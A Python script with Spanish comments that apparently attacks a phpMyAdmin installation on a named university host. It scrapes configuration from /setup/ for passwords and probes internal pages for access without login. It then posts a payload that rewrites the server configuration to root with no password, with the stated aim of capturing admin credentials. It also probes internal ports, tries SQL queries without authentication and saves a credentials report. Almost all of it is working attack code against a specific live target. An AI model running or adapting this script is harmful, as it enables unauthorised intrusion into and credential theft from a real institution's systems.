#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACION AVANZADA VULN-001
Enfoque: Obtener credenciales reales cambiando configuracion via /setup/
"""

import requests
from urllib.parse import urlparse, urljoin
import re
import json
import sys

requests.packages.urllib3.disable_warnings()

TARGET = "https://orcl.uns.edu.pe"
scheme = "https"
base_url = f"{scheme}://{urlparse(TARGET).netloc}"
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": base_url + "/",
})

print("=" * 70)
print("  EXPLOTACION AVANZADA VULN-001 - Buscando Credenciales Reales")
print("=" * 70)

results = {}

# ============================================
# FASE 0: Leer robots.txt para rutas sensibles
# ============================================
print("\n[FASE 0] Leyendo robots.txt...")
try:
    r = session.get(f"{base_url}/robots.txt", timeout=5)
    if r.status_code == 200:
        print(f"  [+] robots.txt: HTTP {r.status_code} ({len(r.text)} bytes)")
        # Buscar rutas sensibles
        disallowed = re.findall(r"Disallow:\s*(\S+)", r.text, re.IGNORECASE)
        if disallowed:
            print(f"  [+] Rutas desalloweadas:")
            for d in disallowed:
                print(f"    -> {d}")
                results[f'robots_{d}'] = f"Disallow"
        print(f"\n  Contenido completo de robots.txt:")
        for line in r.text.strip().split('\n'):
            print(f"    {line}")
        results['robots_content'] = r.text.strip()
    else:
        print(f"  [-] robots.txt: HTTP {r.status_code}")
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# FASE 1: Leer /setup/ para configuracion actual
# ============================================
print("\n\n[FASE 1] Leyendo configuracion actual desde /setup/")
try:
    r = session.get(f"{base_url}/setup/", timeout=10)
    if r.status_code == 200:
        print(f"  [+] /setup/ HTTP {r.status_code}")
        
        # Buscar el servidor configurado actualmente
        # Buscar host, port, user configurados
        config_patterns = [
            (r'cfg\[Servers\]\[1\]\[host\]\s*[=:]\s*["\']?([^"\']+)', "Host"),
            (r'cfg\[Servers\]\[1\]\[port\]\s*[=:]\s*["\']?([^"\']+)', "Port"),
            (r'cfg\[Servers\]\[1\]\[user\]\s*[=:]\s*["\']?([^"\']+)', "User"),
            (r'cfg\[Servers\]\[1\]\[password\]\s*[=:]\s*["\']?([^"\']+)', "Password"),
            (r'auth_type.*?["\']?([^"\',\]]+)', "Auth Type"),
        ]
        
        for pattern, name in config_patterns:
            match = re.search(pattern, r.text, re.IGNORECASE)
            if match:
                val = match.group(1).strip().strip("'\"")
                print(f"  [+] {name}: {val}")
                results[f'current_{name.lower()}'] = val
        
        # Buscar el archivo de configuracion generado
        # phpMyAdmin /setup/ tiene un link para exportar configuracion
        if 'export' in r.text.lower():
            print(f"  [+] Funcion de exportacion encontrada en /setup/")
        
        # Buscar todos los links y forms en /setup/
        links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', r.text)
        print(f"  [+] Links encontrados en /setup/:")
        for link in links[:20]:
            if 'setup' in link.lower() or 'config' in link.lower() or 'server' in link.lower():
                print(f"    -> {link}")
        
        # Buscar el token
        token_match = re.search(r'name="token" value="([^"]+)"', r.text)
        setup_token = token_match.group(1) if token_match else ""
        print(f"  [+] Token de /setup/: {setup_token}")
        
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# FASE 2: Intentar acceder a server_databases.php directamente
# ============================================
print("\n\n[FASE 2] Intentando acceso directo a paginas internas de BD")
internal_pages = [
    "/server_databases.php",
    "/server_sql.php",
    "/db_sql.php", 
    "/server_status.php",
    "/server_variables.php",
    "/server_user_groups.php",
    "/server_collations.php",
    "/server_engines.php",
    "/server_plugins.php",
    "/server_privileges.php",
    "/navigation.php",
    "/main.php",
    "/db_structure.php",
    "/tbl_structure.php",
    "/sql.php",
    "/tbl_sql.php",
    "/db_export.php",
    "/export.php",
]

for page in internal_pages:
    try:
        r = session.get(f"{base_url}{page}", timeout=5)
        if r.status_code == 200 and len(r.text) > 300:
            # Buscar si hay datos de BD o credenciales en la respuesta
            has_data = any(kw in r.text.lower() for kw in [
                '<td', 'mysql', 'database', 'table', 'select',
                'information_schema', 'show databases', 'users',
                'password', 'root', 'admin'
            ])
            requires_login = 'login' in r.text.lower() and 'logout' not in r.text.lower()
            
            if has_data and not requires_login:
                print(f"  [!] ACCESIBLE SIN LOGIN: {page}")
                results[f'internal_access_{page.replace("/", "_")}'] = f"HTTP 200 - DATA VISIBLE"
            elif has_data:
                print(f"  [+] {page} -> HTTP 200 (requiere login)")
                results[f'internal_{page.replace("/", "_")}'] = f"HTTP 200"
            elif 'login' in r.text.lower():
                pass  # Requiere login, normal
            else:
                print(f"  [?] {page} -> HTTP {r.status_code} ({len(r.text)} bytes)")
    except Exception:
        pass

# ============================================
# FASE 3: Explotar /setup/ para cambiar BD y obtener datos
# ============================================
print("\n\n[FASE 3] Explotando /setup/ para reconfigurar servidor")

# Intentar cambiar el servidor a uno que nosotros controlemos
# Para capturar credenciales cuando el admin inicie sesion

setup_payloads = [
    {
        # Cambiar host a IP interna conocida
        "server": "1",
        "target": f"{base_url}/index.php",
        "token": setup_token,
        "action": "savedata",
        "cfg[Servers][1][host]": "190.119.171.165",
        "cfg[Servers][1][port]": "3306",
        "cfg[Servers][1][socket]": "",
        "cfg[Servers][1][connect_type]": "tcp",
        "cfg[Servers][1][extension]": "mysqli",
        "cfg[Servers][1][auth_type]": "config",
        "cfg[Servers][1][user]": "root",
        "cfg[Servers][1][password]": "",
        "cfg[Servers][1][AllowNoPassword]": "true",
        "cfg[Servers][1][only_db]": "",
    },
]

for payload in setup_payloads:
    try:
        r = session.post(f"{base_url}/setup/index.php", data=payload, timeout=10)
        if r.status_code == 200:
            print(f"  [+] POST exitoso a /setup/index.php")
            # Verificar si la configuracion fue guardada
            if 'saved' in r.text.lower() or 'success' in r.text.lower():
                print(f"  [+] Configuracion GUARDADA EXITOSAMENTE")
                results['setup_modify'] = "EXITO"
            else:
                # Verificar si hay algun mensaje de error o exito
                if 'error' in r.text.lower():
                    print(f"  [!] Error en la respuesta")
                else:
                    print(f"  [+] Respuesta HTTP 200 (puede haber funcionado)")
                    results['setup_modify'] = "POSIBLE_EXITO"
            
            # Verificar si podemos descargar la nueva configuracion
            r2 = session.get(f"{base_url}/setup/index.php?page=config", timeout=5)
            if r2.status_code == 200 and len(r2.text) > 100:
                print(f"  [+] Configuracion exportada accesible ({len(r2.text)} bytes)")
                # Buscar credenciales en la configuracion exportada
                creds = re.findall(r"(?:user|password|host|port)['\"]?\s*[:=]\s*['\"]?([^'\"]+)", r2.text)
                if creds:
                    print(f"  [+] Credenciales en config exportada:")
                    for c in creds[:10]:
                        print(f"    -> {c}")
                results['config_export'] = "ACCESIBLE"
        else:
            print(f"  [-] POST status: {r.status_code}")
    except Exception as e:
        print(f"  [-] Error: {e}")

# ============================================
# FASE 4: Intentar acceso via /server_user_groups.php
# ============================================
print("\n\n[FASE 4] Intentando obtener informacion de usuarios MySQL")

# Intentar acceder a pages que muestran usuarios y privilegios
user_pages = [
    "/server_user_groups.php",
    "/server_privileges.php", 
    "/server_user_variables.php",
]

for upage in user_pages:
    try:
        r = session.get(f"{base_url}{upage}", timeout=5)
        if r.status_code == 200:
            # Buscar usuarios
            users = re.findall(r'(root|admin|pma|uns|sistema|usuarios?)', r.text, re.IGNORECASE)
            if users:
                print(f"  [+] {upage} - Usuarios encontrados: {set(users)}")
                results[f'users_{upage.replace("/", "_")}'] = list(set(users))
            else:
                print(f"  [+] {upage} -> HTTP 200 (sin usuarios visibles)")
    except Exception:
        pass

# ============================================
# FASE 5: Intentar acceso a info del servidor
# ============================================
print("\n\n[FASE 5] Informacion del servidor")

# Intentar acceder a paginas que revelan info del sistema
info_pages = [
    "/server_status.php",
    "/server_variables.php",
    "/server_processlist.php",
    "/server_databases.php",
]

for ipage in info_pages:
    try:
        r = session.get(f"{base_url}{ipage}", timeout=5)
        if r.status_code == 200:
            # Buscar variables del sistema
            sys_vars = re.findall(r'([a-z_]+)\s*=\s*[\'"]?([^\'"<>\s]+)', r.text)
            if sys_vars:
                print(f"  [+] {ipage} - Variables del sistema encontradas ({len(sys_vars)})")
                # Buscar variables sensibles
                sensitive_vars = [(k,v) for k,v in sys_vars if any(s in k.lower() for s in ['pass', 'user', 'auth', 'secret', 'key', 'token'])]
                if sensitive_vars:
                    print(f"  [+] Variables SENSIBLES:")
                    for k,v in sensitive_vars[:10]:
                        print(f"    {k} = {v}")
                        results[f'sysvar_{k}'] = v
            else:
                print(f"  [+] {ipage} -> HTTP 200")
    except Exception:
        pass

# ============================================
# FASE 6: Intentar acceder a bases de datos via IP directa
# ============================================
print("\n\n[FASE 6] Verificando acceso a servicios internos")

# Intentar conexión a servicios en el mismo servidor
internal_services = [
    ("http://190.119.171.165:3306", "MySQL"),
    ("http://190.119.171.165:8080", "Apache Backend"),
    ("http://190.119.171.165:80", "Apache"),
]

for url, service in internal_services:
    try:
        r = requests.get(url, timeout=3, verify=False)
        print(f"  [+] {service}: {url} -> HTTP {r.status_code}")
        results[service.lower()] = f"HTTP {r.status_code}"
    except Exception as e:
        # Verificar si el puerto responde de alguna forma
        if "Connection" in str(e):
            print(f"  [?] {service}: {url} -> Puerto visible pero rechaza conexion")
            results[service.lower()] = "PUERTO VISIBLE"

# ============================================
# FASE 7: Intentar con Hydra-style en rutas internas
# ============================================
print("\n\n[FASE 7] Probando acceso sin credenciales a funciones SQL")

# Intentar ejecutar queries SQL directamente via /sql.php
# con diferentes parametros que podrian funcionar sin login

sql_attempts = [
    {"server": "1", "sql_query": "SELECT 1"},
    {"server": "1", "sql_query": "SELECT DATABASE()"},
    {"server": "1", "sql_query": "SHOW DATABASES"},
    {"server": "1", "sql_query": "SELECT USER()"},
    {"server": "1", "sql_query": "SELECT CURRENT_USER()"},
]

for attempt in sql_attempts:
    try:
        r = session.get(f"{base_url}/sql.php", params=attempt, timeout=5)
        if r.status_code == 200 and len(r.text) > 100:
            # Buscar si hay resultados visibles
            has_results = '<td' in r.text or 'mysql' in r.text.lower() or 'database' in r.text.lower()
            if has_results:
                print(f"  [!] SQL ejecutable sin login: {attempt['sql_query']}")
                results['sql_no_auth'] = f"EXITO: {attempt['sql_query']}"
            else:
                print(f"  [?] Respuesta HTTP 200 para: {attempt['sql_query']}")
    except Exception:
        pass

# ============================================
# RESUMEN FINAL
# ============================================
print("\n" + "=" * 70)
print("  RESUMEN DE CREDENCIALES OBTENIDAS")
print("=" * 70)
print(f"\n  Total de resultados: {len(results)}")
for k, v in results.items():
    print(f"    {k}: {v}")

# Guardar todo
with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\reporte_credenciales.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\n  Reporte guardado: reporte_credenciales.json")

# Intentar leer robots.txt completo para ver si hay rutas con credenciales
print("\n\n  RUTAS PROMETEDORAS DE robots.txt:")
if 'robots_content' in results:
    for line in results['robots_content'].split('\n'):
        if 'Disallow' in line:
            path = line.replace('Disallow:', '').strip()
            print(f"    Probar: {base_url}{path}")
